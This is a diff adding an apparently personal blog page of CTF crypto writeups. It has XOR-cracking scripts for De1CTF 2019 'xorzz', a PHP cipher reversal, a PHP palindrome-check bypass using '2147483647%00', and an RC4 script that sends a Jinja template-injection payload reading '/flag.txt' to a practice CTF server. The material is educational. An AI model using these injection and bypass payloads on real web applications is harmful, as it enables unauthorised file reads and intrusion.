@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>密码学题目 | ch4ser の 超元域</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+记录密码学刷过的题目">
+<meta name="author" content="ch4ser">
+<link rel="canonical" href="https://dragonbox.top/posts/ctf-crypto/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.2211ca3164be7830024f6aad2b3a2e520843a64f8f048445c3401c1249aa051d.css" integrity="sha256-IhHKMWS&#43;eDACT2qtKzouUghDpk&#43;PBIRFw0AcEkmqBR0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dragonbox.top/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="https://dragonbox.top/flash.ico">
+<link rel="apple-touch-icon" href="https://dragonbox.top/flash.ico">
+<link rel="mask-icon" href="https://dragonbox.top/flash.ico">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://dragonbox.top/posts/ctf-crypto/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://dragonbox.top/posts/ctf-crypto/">
+  <meta property="og:site_name" content="ch4ser の 超元域">
+  <meta property="og:title" content="密码学题目">
+  <meta property="og:description" content=" 记录密码学刷过的题目">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2019-04-22T04:14:20+00:00">
+    <meta property="article:modified_time" content="2019-04-22T04:14:20+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="密码学题目">
+<meta name="twitter:description" content="
+记录密码学刷过的题目">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://dragonbox.top/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "密码学题目",
+      "item": "https://dragonbox.top/posts/ctf-crypto/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "密码学题目",
+  "name": "密码学题目",
+  "description": " 记录密码学刷过的题目\n",
+  "keywords": [
+    
+  ],
+  "articleBody": " 记录密码学刷过的题目\nDe1ctf2019 xorzz 源码\nfrom itertools import * # from data import flag,plain plain = \"dd\" flag = \"de1ctf{testflag}\" key=flag.strip(\"de1ctf{\").strip(\"}\") assert(len(key)\u003c38) salt=\"WeAreDe1taTeam\" ki=cycle(key) si=cycle(salt) cipher = ''.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si))) for p in plain]) print cipher # output: # 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c 首先将密文中的盐分去掉。\nfrom itertools import * from base64 import * output='49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c' salt=\"WeAreDe1taTeam\" sa = cycle(salt) out = output.decode('hex') res = \"\" for i in out: res += chr(ord(i) ^ ord(next(sa))) # print b64encode(res.encode('hex')) print b64encode(res) 去掉盐分之后，问题就变成了汉明文密码。原理见博客https://www.anquanke.com/post/id/161171#h2-0 这里直接上脚本了。\n# -*- coding: utf-8 -*- import itertools import linecache CHARACTER_FREQ = { 'a': 0.0651738, 'b': 0.0124248, 'c': 0.0217339, 'd': 0.0349835, 'e': 0.1041442, 'f': 0.0197881, 'g': 0.0158610, 'h': 0.0492888, 'i': 0.0558094, 'j': 0.0009033, 'k': 0.0050529, 'l': 0.0331490, 'm': 0.0202124, 'n': 0.0564513, 'o': 0.0596302, 'p': 0.0137645, 'q': 0.0008606, 'r': 0.0497563, 's': 0.0515760, 't': 0.0729357, 'u': 0.0225134, 'v': 0.0082903, 'w': 0.0171272, 'x': 0.0013692, 'y': 0.0145984, 'z': 0.0007836, ' ': 0.1918182 } def xor_repeat_key(key,string): key_len=len(key) result='' str_result='' for index,ch in enumerate(string): n=index%key_len b=chr(ord(key[n])^ord(ch)) str_result+=b return str_result #获得概率分数 def get_score(string): score=0 for char in string: char=char.lower() if char in CHARACTER_FREQ: score+=CHARACTER_FREQ[char] return score #将hex的每个字符与备选密钥进行xor def single_xor(candidate_key,hex_string): result=\"\" for i in hex_string: b=chr(candidate_key^ord(i)) result+=b return result #遍历备选密钥 def Traversal_singlechar(hex_string): candidate=[] for candidate_key in range(256): plaintext=single_xor(candidate_key,hex_string) score=get_score(plaintext) result={ 'score':score, 'plaintext':plaintext, 'key':candidate_key } candidate.append(result) return sorted(candidate,key=lambda c:c['score'])[-1] def hamming_distance(a_str,b_str): dist=0 for x,y in zip(a_str,b_str): b=bin(ord(x)^ord(y)) #转换为二进制（以字符串形式表示，如“0b100000”，0b表示二进制） dist+=b.count('1') return dist def guess_keysize(string): normals=[] for keysize in range(2,40): blocks=[] cnt=0 distance=0 #根据建议获得四个block，将这四个block两两得到hamming_distance。 for i in range(0,len(string),keysize): cnt+=1 blocks.append(string[i:i+keysize]) if cnt==4: break pairs=itertools.combinations(blocks,2) for (x,y) in pairs: distance+=hamming_distance(x,y) #平均一下 distance=distance/(6.0) #Normalize this result by dividing by KEYSIZE. normal_distance=distance/keysize key={ 'keysize':keysize, 'distance':normal_distance } normals.append(key) #print key #选3个最小的为待选的keysize candidate_keysize=sorted(normals,key=lambda c:c['distance'])[0:3] return candidate_keysize def guess_key(keysize,string): now_str='' key='' for i in range(keysize): now_str='' for index,ch in enumerate(string): if index%keysize==i: now_str+=ch #获得key的第i位的值,转换为字符 #print now_str key+=chr(Traversal_singlechar(now_str)['key']) return key def get_plaint(string): keysize_list=guess_keysize(string) candidate_key=[] possible_plaints=[] for keysize in keysize_list: key=guess_key(keysize['keysize'],string) #print key possible_plaints.append((xor_repeat_key(key,string),key)) ''' for i in possible_plaints: print i[1] print get_score(i[0].decode('hex')) print len(i[0]) print i[0].decode('hex') ''' return sorted(possible_plaints,key=lambda c:get_score(c[0]))[-1] def main(): assert hamming_distance('this is a test', 'wokka wokka!!!') == 37 contents=open('6.txt').read() #base64解码 string=str(contents).decode('base64') result=get_plaint(string) print result[0] print result[1] if __name__ == '__main__': main() 6.txt中的内容是去盐分之后的密文base64之后的内容。\n再附上hctf2018中天枢的脚本\nimport string def bxor(a, b): # xor two byte strings of different lengths if len(a) \u003e len(b): return bytes([x ^ y for x, y in zip(a[:len(b)], b)]) else: return bytes([x ^ y for x, y in zip(a, b[:len(a)])]) def hamming_distance(b1, b2): differing_bits = 0 for byte in bxor(b1, b2): differing_bits += bin(byte).count(\"1\") return differing_bits def break_single_key_xor(text): key = 0 possible_space=0 max_possible=0 letters = string.ascii_letters.encode('ascii') for a in range(0, len(text)): maxpossible = 0 for b in range(0, len(text)): if(a == b): continue c = text[a] ^ text[b] if c not in letters and c != 0: continue maxpossible += 1 if maxpossible\u003emax_possible: max_possible=maxpossible possible_space=a key = text[possible_space]^ 0x20 return chr(key) text = '' with open(\"6.txt\",\"r\") as f: for line in f: text += line # b = base64.b64decode(text) b = text normalized_distances = [] for KEYSIZE in range(2, 40): b1 = b[: KEYSIZE] b2 = b[KEYSIZE: KEYSIZE * 2] b3 = b[KEYSIZE * 2: KEYSIZE * 3] b4 = b[KEYSIZE * 3: KEYSIZE * 4] b5 = b[KEYSIZE * 4: KEYSIZE * 5] b6 = b[KEYSIZE * 5: KEYSIZE * 6] normalized_distance = float( hamming_distance(b1, b2) + hamming_distance(b2, b3) + hamming_distance(b3, b4) + hamming_distance(b4, b5) + hamming_distance(b5, b6) ) / (KEYSIZE * 5) normalized_distances.append( (KEYSIZE, normalized_distance) ) normalized_distances = sorted(normalized_distances,key=lambda x:x[1]) for KEYSIZE,_ in normalized_distances[:5]: block_bytes = [[] for _ in range(KEYSIZE)] for i, byte in enumerate(b): block_bytes[i % KEYSIZE].append(byte) keys = '' try: for bbytes in block_bytes: keys += break_single_key_xor(bbytes) key = bytearray(keys * len(b), \"utf-8\") plaintext = bxor(b, key) print(\"keysize:\", KEYSIZE) print(\"key is:\", keys, \"n\") s = bytes.decode(plaintext) print(s) except Exception: continue MD5 PHP_encrypto_1 source code:::\n\u003c?php function encrypt($data,$key) { $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i \u003c $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x+=1; } for ($i=0; $i \u003c $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?\u003e//the result is fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= solving:\n\u003c?php #'ISCC'md5之后的结果 $mkey ='729623334f0aa2784a1599fd374c120d'; $target='fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='; $target=base64_decode($target); $target_ay=array(); for ($i=0;$i\u003cstrlen($target);$i++) { echo ord($target[$i]).' '; array_push($target_ay,ord($target[$i])); } echo \"||||||||\"; $j=0; $realkey_ay=array(); for ($i=0;$i\u003cstrlen($target);$i++){ if ($j==strlen($mkey)){ $j=0; } echo ord($mkey[$j]).' '; array_push($realkey_ay,ord($mkey[$j])); $j++; } $flag1=''; $flag2=''; foreach($target_ay as $key=\u003e$value){ $i=$key; $dd=$value; $od=$realkey_ay[$i]; $flag1.=chr($dd+128-$od); $flag2.=chr($dd-$od); } echo $flag1; echo $flag2; ?\u003e other shiyanbar do you really know php?(plalindrome) \u003c?php $info = \"\"; $req = []; $flag=\"xxxxxxxxxx\"; ini_set(\"display_error\", false); error_reporting(0); if(!isset($_POST['number'])){ header(\"hint:6c525af4059b4fe7d8c33a.txt\"); die(\"have a fun!!\"); } foreach([$_POST] as $global_var) { foreach($global_var as $key =\u003e $value) { $value = trim($value); is_string($value) \u0026\u0026 $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i \u003c $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } //can not input number if(is_numeric($_REQUEST['number'])){ $info=\"sorry, you cann't input a number!\"; //the number must be int-type }elseif($req['number']!=strval(intval($req['number']))){ $info = \"number must be equal to it's integer!! \"; }else{ $value1 = intval($req[\"number\"]); $value2 = intval(strrev($req[\"number\"])); //the number should be plalindrome if($value1!=$value2){ $info=\"no, this is not a palindrome number!\"; }else{ //the number should not be plalindrome if(is_palindrome_number($req[\"number\"])){ $info = \"nice! {$value1} is a palindrome number!\"; }else{ $info=$flag; } } } echo $info; ?\u003e payload :2147483647%00\nfirst: as there is %00, is_numeric() will not recognize it as number\nsecond: both strval and intval will ignore %00 and %20\nthird: after strrev() 2147483647 will turn to 7463847412 , however, intval() can hanle max num of 2147483647, so intval(7463847412)=2147483647\nforth: the number is not plalindrome,so get the flag\nRC4 rc4: 加密和解密都是同一个流程\nimport urllib import requests url = \"http://43141291-ab15-4d3a-a236-3c2c0fd69898.node3.buuoj.cn/secret?secret=\" class RC4: def __init__(self, key): self.key = key self.key_length = len(key) self._init_S_box() def _init_S_box(self): self.Box = [i for i in range(256)] k = [self.key[i % self.key_length] for i in range(256)] j = 0 for i in range(256): j = (j + self.Box[i] + ord(k[i])) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] def crypt(self, plaintext): i = 0 j = 0 result = '' for ch in plaintext: i = (i + 1) % 256 j = (j + self.Box[i]) % 256 self.Box[i], self.Box[j] = self.Box[j], self.Box[i] t = (self.Box[i] + self.Box[j]) % 256 result += chr(self.Box[t] ^ ord(ch)) return result a = RC4('HereIsTreasure') cmd = \"{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}\" payload = urllib.parse.quote(a.crypt(cmd)) res = requests.get(url + payload) print(res.text) ",
+  "wordCount" : "1043",
+  "inLanguage": "en",
+  "datePublished": "2019-04-22T04:14:20Z",
+  "dateModified": "2019-04-22T04:14:20Z",
+  "author":{
+    "@type": "Person",
+    "name": "ch4ser"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://dragonbox.top/posts/ctf-crypto/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "ch4ser の 超元域",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://dragonbox.top/flash.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://dragonbox.top/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
+                <img src="https://dragonbox.top/avatar.jpg" alt="" aria-label="logo"
+                    height="35">ch4ser の 超元域</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://dragonbox.top/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://dragonbox.top/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://dragonbox.top/">Home</a>&nbsp;»&nbsp;<a href="https://dragonbox.top/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      密码学题目
+    </h1>
+    <div class="post-meta"><span title='2019-04-22 04:14:20 +0000 UTC'>April 22, 2019</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1043 words&nbsp;·&nbsp;ch4ser
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#de1ctf2019-xorzz">De1ctf2019 xorzz</a></li>
+    <li><a href="#md5">MD5</a>
+      <ul>
+        <li><a href="#php_encrypto_1">PHP_encrypto_1</a></li>
+      </ul>
+    </li>
+    <li><a href="#other">other</a>
+      <ul>
+        <li><a href="#shiyanbar-do-you-really-know-phpplalindrome">shiyanbar do you really know php?(plalindrome)</a></li>
+      </ul>
+    </li>
+    <li><a href="#rc4">RC4</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p>记录密码学刷过的题目</p></blockquote>
+<h2 id="de1ctf2019-xorzz">De1ctf2019 xorzz<a hidden class="anchor" aria-hidden="true" href="#de1ctf2019-xorzz">#</a></h2>
+<p>源码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  from data import flag,plain</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>plain <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dd&#34;</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;de1ctf</span><span style="color:#e6db74">{testflag}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>key<span style="color:#f92672">=</span>flag<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;de1ctf{&#34;</span>)<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#34;}&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span>(len(key)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">38</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>salt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WeAreDe1taTeam&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ki<span style="color:#f92672">=</span>cycle(key)
+</span></span><span style="display:flex;"><span>si<span style="color:#f92672">=</span>cycle(salt)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([hex(ord(p) <span style="color:#f92672">^</span> ord(next(ki)) <span style="color:#f92672">^</span> ord(next(si))) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> plain])
+</span></span><span style="display:flex;"><span>print cipher
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># output:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span>
+</span></span></code></pre></div><p>首先将密文中的盐分去掉。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>output<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>salt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WeAreDe1taTeam&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> cycle(salt)
+</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> output<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> out:
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">+=</span> chr(ord(i) <span style="color:#f92672">^</span> ord(next(sa)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  print b64encode(res.encode(&#39;hex&#39;))</span>
+</span></span><span style="display:flex;"><span>print b64encode(res)
+</span></span></code></pre></div><p>去掉盐分之后，问题就变成了汉明文密码。原理见博客https://www.anquanke.com/post/id/161171#h2-0
+这里直接上脚本了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> itertools
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> linecache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CHARACTER_FREQ <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;a&#39;</span>: <span style="color:#ae81ff">0.0651738</span>, <span style="color:#e6db74">&#39;b&#39;</span>: <span style="color:#ae81ff">0.0124248</span>, <span style="color:#e6db74">&#39;c&#39;</span>: <span style="color:#ae81ff">0.0217339</span>, <span style="color:#e6db74">&#39;d&#39;</span>: <span style="color:#ae81ff">0.0349835</span>, <span style="color:#e6db74">&#39;e&#39;</span>: <span style="color:#ae81ff">0.1041442</span>, <span style="color:#e6db74">&#39;f&#39;</span>: <span style="color:#ae81ff">0.0197881</span>, <span style="color:#e6db74">&#39;g&#39;</span>: <span style="color:#ae81ff">0.0158610</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;h&#39;</span>: <span style="color:#ae81ff">0.0492888</span>, <span style="color:#e6db74">&#39;i&#39;</span>: <span style="color:#ae81ff">0.0558094</span>, <span style="color:#e6db74">&#39;j&#39;</span>: <span style="color:#ae81ff">0.0009033</span>, <span style="color:#e6db74">&#39;k&#39;</span>: <span style="color:#ae81ff">0.0050529</span>, <span style="color:#e6db74">&#39;l&#39;</span>: <span style="color:#ae81ff">0.0331490</span>, <span style="color:#e6db74">&#39;m&#39;</span>: <span style="color:#ae81ff">0.0202124</span>, <span style="color:#e6db74">&#39;n&#39;</span>: <span style="color:#ae81ff">0.0564513</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;o&#39;</span>: <span style="color:#ae81ff">0.0596302</span>, <span style="color:#e6db74">&#39;p&#39;</span>: <span style="color:#ae81ff">0.0137645</span>, <span style="color:#e6db74">&#39;q&#39;</span>: <span style="color:#ae81ff">0.0008606</span>, <span style="color:#e6db74">&#39;r&#39;</span>: <span style="color:#ae81ff">0.0497563</span>, <span style="color:#e6db74">&#39;s&#39;</span>: <span style="color:#ae81ff">0.0515760</span>, <span style="color:#e6db74">&#39;t&#39;</span>: <span style="color:#ae81ff">0.0729357</span>, <span style="color:#e6db74">&#39;u&#39;</span>: <span style="color:#ae81ff">0.0225134</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;v&#39;</span>: <span style="color:#ae81ff">0.0082903</span>, <span style="color:#e6db74">&#39;w&#39;</span>: <span style="color:#ae81ff">0.0171272</span>, <span style="color:#e6db74">&#39;x&#39;</span>: <span style="color:#ae81ff">0.0013692</span>, <span style="color:#e6db74">&#39;y&#39;</span>: <span style="color:#ae81ff">0.0145984</span>, <span style="color:#e6db74">&#39;z&#39;</span>: <span style="color:#ae81ff">0.0007836</span>, <span style="color:#e6db74">&#39; &#39;</span>: <span style="color:#ae81ff">0.1918182</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_repeat_key</span>(key,string):
+</span></span><span style="display:flex;"><span>	key_len<span style="color:#f92672">=</span>len(key)
+</span></span><span style="display:flex;"><span>	result<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	str_result<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> index,ch <span style="color:#f92672">in</span> enumerate(string):
+</span></span><span style="display:flex;"><span>		n<span style="color:#f92672">=</span>index<span style="color:#f92672">%</span>key_len
